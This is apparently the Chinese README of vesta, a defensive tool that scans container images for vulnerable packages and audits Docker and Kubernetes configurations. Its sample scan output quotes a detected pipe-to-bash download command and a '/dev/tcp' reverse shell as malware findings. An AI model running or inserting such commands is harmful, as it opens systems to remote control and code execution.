<p align="center" style="text-align: center">
    <img src="https://user-images.githubusercontent.com/35037256/212051309-56468d85-4132-4780-9722-d1c0dcc79b1b.png" width="55%">
<br/>
</p>

<p align="center">
  一款集容器扫描，Docker和Kubernetes配置基线检查于一身的工具
</p>

<div align="center">
<strong>
<samp>

[English](README.md) · [简体中文](README.zh-Hans.md)

</samp>
</strong>
</div>

## 概述

vesta是一款集容器扫描，Docker和Kubernetes配置基线检查于一身的工具。检查内容包括镜像或容器中包含漏洞版本的组件，同时根据云上实战渗透经验检查Docker以及Kubernetes的危险配置
<br/>
<br/>
vesta同时也是一个灵活，方便的工具，能够在各种系统上运行，包括但不限于Windows，Linux以及MacOS

<details>
<summary>
<font size="5"><b>Demo</b></font>
</summary>

<samp>

![](https://user-images.githubusercontent.com/35037256/212480704-c6e6f7ac-6531-4eda-b3a2-1ca99eeedfcf.gif)

</samp>
</details>

---

## 检查项

> Scan
- 扫描通过主流安装方法安装程序的漏洞
  - apt/apt-get
  - rpm
  - yum
  - dpkg
- 扫描软件依赖的漏洞以及恶意投毒的依赖包
  - Java(Jar, War, 以及主流依赖log4j)
  - NodeJs(NPM, YARN)
  - Python(Wheel, Poetry)
  - Golang(Go binary)
  - PHP(Composer, 以及主流的PHP框架: laravel, thinkphp, wordpress, wordpress插件等)
  - Rust(Rust binary)

> Docker检查

| Supported | Check Item                | Description                        | Severity                 | Reference                                                                                   |
|-----------|---------------------------|------------------------------------|--------------------------|---------------------------------------------------------------------------------------------|
| ✔         | PrivilegeAllowed          | 危险的特权模式                            | critical                 | [Ref](https://github.com/kvesta/vesta/wiki/Capabilities-and-Privileged-Checking-References) |
| ✔         | Capabilities              | 危险capabilities被设置                  | critical                 | [Ref](https://github.com/kvesta/vesta/wiki/Capabilities-and-Privileged-Checking-References) | 
| ✔         | Volume Mount              | 敏感或危险目录被挂载                         | critical                 | [Ref](https://github.com/kvesta/vesta/wiki/Volume-Mount-Checking-References)                |
| ✔         | Docker Unauthorized       | 2375端口打开并且未授权                      | critical                 | [Ref](https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce/README.md)       |
| ✔         | Kernel version            | 当前内核版本存在逃逸漏洞                       | critical                 | [Ref](https://github.com/kvesta/vesta/wiki/Kernel-Version-References)                       |
| ✔         | Network Module            | Net模式为`host`模式或同时在特定containerd版本下  | critical/medium          |                                                                                             |
| ✔         | Pid Module                | Pid模式被设置为`host`                    | high                     |                                                                                             |
| ✔         | Docker Server version     | Docker Server版本存在漏洞                | critical/high/medium/low |                                                                                             |
| ✔         | Docker env password check | Docker env是否存在弱密码                  | high/medium              |                                                                                             |
| ✔         | Image tag check           | Image没有被打tag或为默认latest             | low                      |                                                                                             |
| ✔         | Docker history            | Docker layers 存在不安全的命令             | high/medium              |                                                                                             |
| Pending   | Docker Backdoor           | Docker env command 存在恶意命令          | critical/high            |                                                                                             |



---

> Kubernetes检查


| Supported | Check Item                                               | Description                              | Severity                  | Reference                                                                                             |
|-----------|----------------------------------------------------------|------------------------------------------|---------------------------|-------------------------------------------------------------------------------------------------------|
| ✔         | PrivilegeAllowed                                         | 危险的特权模式                                  | critical                  | [Ref](https://github.com/kvesta/vesta/wiki/Capabilities-and-Privileged-Checking-References)           |
| ✔         | Capabilities                                             | 危险capabilities被设置                        | critical                  | [Ref](https://github.com/kvesta/vesta/wiki/Capabilities-and-Privileged-Checking-References)           |
| ✔         | PV and PVC                                               | PV 被挂载到敏感目录并且状态为active                   | critical/medium           | [Ref](https://github.com/kvesta/vesta/wiki/Volume-Mount-Checking-References)                          |
| ✔         | RBAC                                                     | K8s 权限存在危险配置                             | high/medium/ low/warning  |                                                                                                       |
| ✔         | Kubernetes-dashborad                                     | 检查 `-enable-skip-login`以及 dashborad的账户权限 | critical/high/ low        | [Ref](https://xz.aliyun.com/t/11316#toc-10)                                                           |
| ✔         | Kernel version                                           | 当前内核版本存在逃逸漏洞                             | critical                  | [Ref](https://github.com/kvesta/vesta/wiki/Kernel-Version-References)                                 |
| ✔         | Docker Server version  (k8s versions is less than v1.24) | Docker Server版本存在漏洞                      | critical/high/ medium/low |                                                                                                       |
| ✔         | Kubernetes certification expiration                      | 证书到期时间小于30天                              | medium                    |                                                                                                       |
| ✔         | ConfigMap and Secret check                               | ConfigMap 或者 Secret是否存在弱密码               | high/medium               |                                                                                                       |
| ✔         | PodSecurityPolicy check (k8s version under the v1.25)    | PodSecurityPolicy过度容忍Pod不安全配置            | high/medium/low           | [Ref](https://kubernetes.io/blog/2021/04/06/podsecuritypolicy-deprecation-past-present-and-future/)   |
| ✔         | Auto Mount ServiceAccount Token                          | Pod默认挂载了service token                    | critical/high/ medium/low | [Ref](https://kubernetes.io/zh-cn/docs/tasks/configure-pod-container/configure-service-account/)      |
| ✔         | NoResourceLimits                                         | 没有限制资源的使用，例如CPU,Memory, 存储               | low                       | [Ref](https://www.aquasec.com/cloud-native-academy/docker-container/docker-cis-benchmark/)            |
| ✔         | Job and Cronjob                                          | Job或CronJob没有设置seccomp或seLinux安全策略       | low                       | [Ref](https://www.aquasec.com/cloud-native-academy/docker-container/docker-cis-benchmark/)            | 
| ✔         | Envoy admin                                              | Envoy admin被配置以及监听`0.0.0.0`.             | high/medium               | [Ref](https://www.envoyproxy.io/docs/envoy/latest/start/quick-start/admin#admin)                      |
| ✔         | Cilium version                                           | Cilium 存在漏洞版本                            | critical/high/ medium/low | [Ref](https://security.snyk.io/package/golang/github.com%2Fcilium%2Fcilium)                           |
| ✔         | Istio configurations                                     | Istio 存在漏洞版本以及安全配置检查                     | critical/high/ medium/low | [Ref](https://istio.io/latest/news/security/)                                                         |
| ✔         | Kubelet 10255 and Kubectl proxy                          | 10255 port 打开或 Kubectl proxy开启           | high/medium/ low          |                                                                                                       |
| ✔         | Etcd configuration                                       | Etcd 安全配置检查                              | high/medium               |                                                                                                       |
| ✔         | Sidecar configurations                                   | Sidecar 安全配置检查以及Env环境检查                  | critical/high/ medium/low |                                                                                                       |              
| ✔         | Pod annotation                                           | Pod annotation 存在不安全配置                   | high/medium/ low/warning  | [Ref](https://github.com/kvesta/vesta/wiki/Annotation-Checking-References)                            |
| ✔         | DaemonSet                                                | DaemonSet存在不安全配置                         | critical/high/ medium/low |                                                                                                       |
| ✔         | Backdoor                                                 | 检查k8s中是否有后门                              | critical/high             | [Ref](https://github.com/kvesta/vesta/wiki/Backdoor-Detection)                                        |


## 编译并使用vesta

1. 编译vesta
- 使用`make build` 进行编译
- 从[Releases](https://github.com/kvesta/vesta/releases)上下载可执行文件
2. 使用vesta检查镜像过容器中的漏洞组件版本（使用镜像ID，镜像标签或使用`-f`文件输入均可）

```bash
$./vesta scan container -f example.tar

2022/11/29 22:50:19 Begin upgrading vulnerability database
2022/11/29 22:50:19 Vulnerability Database is already initialized
2022/11/29 22:50:19 Begin to analyze the layer
2022/11/29 22:50:35 Begin to scan the layer

Detected 216 vulnerabilities

+-----+--------------------+-----------------+------------------+-------+----------+------------------------------------------------------------------+
| 208 | python3.6 - Django | 2.2.3           | CVE-2019-14232   |   7.5 | high     | An issue was discovered                                          |
|     |                    |                 |                  |       |          | in Django 1.11.x before                                          |
|     |                    |                 |                  |       |          | 1.11.23, 2.1.x before 2.1.11,                                    |
|     |                    |                 |                  |       |          | and 2.2.x before 2.2.4. If                                       |
|     |                    |                 |                  |       |          | django.utils.text.Truncator's                                    |
|     |                    |                 |                  |       |          | chars() and words() methods                                      |
|     |                    |                 |                  |       |          | were passed the html=True                                        |
|     |                    |                 |                  |       |          | argument, t ...                                                  |
+-----+                    +-----------------+------------------+-------+----------+------------------------------------------------------------------+
| 209 |                    | 2.2.3           | CVE-2019-14233   |   7.5 | high     | An issue was discovered                                          |
|     |                    |                 |                  |       |          | in Django 1.11.x before                                          |
|     |                    |                 |                  |       |          | 1.11.23, 2.1.x before 2.1.11,                                    |
|     |                    |                 |                  |       |          | and 2.2.x before 2.2.4.                                          |
|     |                    |                 |                  |       |          | Due to the behaviour of                                          |
|     |                    |                 |                  |       |          | the underlying HTMLParser,                                       |
|     |                    |                 |                  |       |          | django.utils.html.strip_tags                                     |
|     |                    |                 |                  |       |          | would be extremely ...                                           |
+-----+                    +-----------------+------------------+-------+----------+------------------------------------------------------------------+
| 210 |                    | 2.2.3           | CVE-2019-14234   |   9.8 | critical | An issue was discovered in                                       |
|     |                    |                 |                  |       |          | Django 1.11.x before 1.11.23,                                    |
|     |                    |                 |                  |       |          | 2.1.x before 2.1.11, and 2.2.x                                   |
|     |                    |                 |                  |       |          | before 2.2.4. Due to an error                                    |
|     |                    |                 |                  |       |          | in shallow key transformation,                                   |
|     |                    |                 |                  |       |          | key and index lookups for                                        |
|     |                    |                 |                  |       |          | django.contrib.postgres.f ...                                    |
+-----+--------------------+-----------------+------------------+-------+----------+------------------------------------------------------------------+
| 211 | python3.6 - numpy  | 1.24.2          |                  |   8.5 | high     | Malicious package is detected in                                 |
|     |                    |                 |                  |       |          | '/usr/local/lib/python3.6/site-packages/numpy/setup.py',         |
|     |                    |                 |                  |       |          | malicious command "curl https://vuln.com | bash" are             |
|     |                    |                 |                  |       |          | detected.                                                        |
+-----+--------------------+-----------------+------------------+-------+----------+------------------------------------------------------------------+

```

3. 使用vesta检查Docker的基线配置

```bash
$./vesta analyze docker

2022/11/29 23:06:32 Start analysing

Detected 3 vulnerabilities

+----+----------------------------+----------------+--------------------------------+----------+--------------------------------+
| ID |      CONTAINER DETAIL      |     PARAM      |             VALUE              | SEVERITY |          DESCRIPTION           |
+----+----------------------------+----------------+--------------------------------+----------+--------------------------------+
|  1 | Name: Kernel               | kernel version | 5.10.104-linuxkit              | critical | Kernel version is suffering    |
|    | ID: None                   |                |                                |          | the CVE-2022-0492 with         |
|    |                            |                |                                |          | CAP_SYS_ADMIN and v1           |
|    |                            |                |                                |          | architecture of cgroups        |
|    |                            |                |                                |          | vulnerablility, has a          |
|    |                            |                |                                |          | potential container escape.    |
+----+----------------------------+----------------+--------------------------------+----------+--------------------------------+
|  2 | Name: vesta_vuln_test      | kernel version | 5.10.104-linuxkit              | critical | Kernel version is suffering    |
|    | ID: 207cf8842b15           |                |                                |          | the Dirty Pipe vulnerablility, |
|    |                            |                |                                |          | has a potential container      |
|    |                            |                |                                |          | escape.                        |
+----+----------------------------+----------------+--------------------------------+----------+--------------------------------+
|  3 | Name: Image Tag            | Privileged     | true                           | critical | There has a potential container|
|    | ID: None                   |                |                                |          | escape in privileged  module.  |
|    |                            |                |                                |          |                                |
+----+----------------------------+----------------+--------------------------------+----------+--------------------------------+
|  4 | Name: Image Configuration  | Image History  | Image name:                    | high     | Weak password found            |
|    | ID: None                   |                | vesta_history_test:latest |    |          | in command: ' echo             |
|    |                            |                | Image ID: 4bc05e1e3881         |          | 'password=test123456' >        |
|    |                            |                |                                |          | config.ini # buildkit'.        |
+----+----------------------------+----------------+--------------------------------+----------+--------------------------------+
```

4. 使用vesta检查Kubernetes的基线配置

```bash
2022/11/29 23:15:59 Start analysing
2022/11/29 23:15:59 Geting docker server version
2022/11/29 23:15:59 Geting kernel version

Detected 4 vulnerabilities

Pods:
+----+--------------------------------+--------------------------------+--------------------------------+-----------------------+----------+--------------------------------+
| ID |           POD DETAIL           |             PARAM              |             VALUE              |         TYPE          | SEVERITY |          DESCRIPTION           |
+----+--------------------------------+--------------------------------+--------------------------------+-----------------------+----------+--------------------------------+
|  1 | Name: vulntest | Namespace:    | sidecar name: vulntest |       | true                           | Pod                   | critical | There has a potential          |
|    | default | Status: Running |    | Privileged                     |                                |                       |          | container escape in privileged |
|    | Node Name: docker-desktop      |                                |                                |                       |          | module.                        |
+    +                                +--------------------------------+--------------------------------+-----------------------+----------+--------------------------------+
|    |                                | sidecar name: vulntest |       | Token:Password123456           | Sidecar EnvFrom       | high     | Sidecar envFrom ConfigMap has  |
|    |                                | env                            |                                |                       |          | found weak password:           |
|    |                                |                                |                                |                       |          | 'Password123456'.              |
+    +                                +--------------------------------+--------------------------------+-----------------------+----------+--------------------------------+
|    |                                | sidecar name: sidecartest |    | MALWARE: bash -i >&            | Sidecar Env           | high     | Container 'sidecartest' finds  |
|    |                                | env                            | /dev/tcp/10.0.0.1/8080 0>&1    |                       |          | high risk content(score:       |
|    |                                |                                |                                |                       |          | 0.91 out of 1.0), which is a   |
|    |                                |                                |                                |                       |          | suspect command backdoor.      |
+----+--------------------------------+--------------------------------+--------------------------------+-----------------------+----------+--------------------------------+
|  2 | Name: vulntest2 | Namespace:   | sidecar name: vulntest2 |      | CAP_SYS_ADMIN                  | capabilities.add      | critical | There has a potential          |
|    | default | Status: Running |    | capabilities                   |                                |                       |          | container escape in privileged |
|    | Node Name: docker-desktop      |                                |                                |                       |          | module.                        |
+    +                                +--------------------------------+--------------------------------+-----------------------+----------+--------------------------------+
|    |                                | sidecar name: vulntest2 |      | true                           | kube-api-access-lcvh8 | critical | Mount service account          |
|    |                                | automountServiceAccountToken   |                                |                       |          | and key permission are         |
|    |                                |                                |                                |                       |          | given, which will cause a      |
|    |                                |                                |                                |                       |          | potential container escape.    |
|    |                                |                                |                                |                       |          | Reference clsuterRolebind:     |
|    |                                |                                |                                |                       |          | vuln-clusterrolebinding |      |
|    |                                |                                |                                |                       |          | roleBinding: vuln-rolebinding  |
+    +                                +--------------------------------+--------------------------------+-----------------------+----------+--------------------------------+
|    |                                | sidecar name: vulntest2 |      | cpu                            | Pod                   | low      | CPU usage is not limited.      |
|    |                                | Resource                       |                                |                       |          |                                |
|    |                                |                                |                                |                       |          |                                |
+----+--------------------------------+--------------------------------+--------------------------------+-----------------------+----------+--------------------------------+

Configures:
+----+-----------------------------+--------------------------------+--------------------------------------------------------+----------+--------------------------------+
| ID |            TYPEL            |             PARAM              |                         VALUE                          | SEVERITY |          DESCRIPTION           |
+----+-----------------------------+--------------------------------+--------------------------------------------------------+----------+--------------------------------+
|  1 | K8s version less than v1.24 | kernel version                 | 5.10.104-linuxkit                                      | critical | Kernel version is suffering    |
|    |                             |                                |                                                        |          | the CVE-2022-0185 with         |
|    |                             |                                |                                                        |          | CAP_SYS_ADMIN vulnerablility,  |
|    |                             |                                |                                                        |          | has a potential container      |
|    |                             |                                |                                                        |          | escape.                        |
+----+-----------------------------+--------------------------------+--------------------------------------------------------+----------+--------------------------------+
|  2 | ConfigMap                   | ConfigMap Name: vulnconfig     | db.string:mysql+pymysql://dbapp:Password123@db:3306/db | high     | ConfigMap has found weak       |
|    |                             | Namespace: default             |                                                        |          | password: 'Password123'.       |
+----+-----------------------------+--------------------------------+--------------------------------------------------------+----------+--------------------------------+
|  3 | Secret                      | Secret Name: vulnsecret-auth   | password:Password123                                   | high     | Secret has found weak          |
|    |                             | Namespace: default             |                                                        |          | password: 'Password123'.       |
+----+-----------------------------+--------------------------------+--------------------------------------------------------+----------+--------------------------------+
|  4 | ClusterRoleBinding          | binding name:                  | verbs: get, watch, list,                               | high     | Key permissions with key       |
|    |                             | vuln-clusterrolebinding |      | create, update | resources:                            |          | resources given to the         |
|    |                             | rolename: vuln-clusterrole |   | pods, services                                         |          | default service account, which |
|    |                             | kind: ClusterRole | subject    |                                                        |          | will cause a potential data    |
|    |                             | kind: Group | subject name:    |                                                        |          | leakage.                       |
|    |                             | system:serviceaccounts:vuln |  |                                                        |          |                                |
|    |                             | namespace: vuln                |                                                        |          |                                |
+----+-----------------------------+--------------------------------+--------------------------------------------------------+----------+--------------------------------+
|  5 | RoleBinding                 | binding name: vuln-rolebinding | verbs: get, watch, list,                               | high     | Key permissions with key       |
|    |                             | | rolename: vuln-role | role   | create, update | resources:                            |          | resources given to the         |
|    |                             | kind: Role | subject kind:     | pods, services                                         |          | default service account, which |
|    |                             | ServiceAccount | subject name: |                                                        |          | will cause a potential data    |
|    |                             | default | namespace: default   |                                                        |          | leakage.                       |
+----+-----------------------------+--------------------------------+--------------------------------------------------------+----------+--------------------------------+
|  6 | ClusterRoleBinding          | binding name:                  | verbs: get, watch, list,                               | warning  | Key permission are given       |
|    |                             | vuln-clusterrolebinding2 |     | create, update | resources:                            |          | to unknown user 'testUser',    |
|    |                             | rolename: vuln-clusterrole |   | pods, services                                         |          | printing it for checking.      |
|    |                             | subject kind: User | subject   |                                                        |          |                                |
|    |                             | name: testUser | namespace:    |                                                        |          |                                |
|    |                             | all                            |                                                        |          |                                |
+----+-----------------------------+--------------------------------+--------------------------------------------------------+----------+--------------------------------+
```


## 使用方法

```bash
$./vesta -h
Vesta is a static analysis of vulnerabilities, Docker and Kubernetes configuration detect toolkit
               Tutorial is available at https://github.com/kvesta/vesta

Usage:
  vesta [command]

Available Commands:
  analyze     Kubernetes analyze
  completion  Generate the autocompletion script for the specified shell
  help        Help about any command
  scan        Container scan
  update      Update vulnerability database
  version     Print version information and quit

Flags:
  -h, --help   help for vesta
```
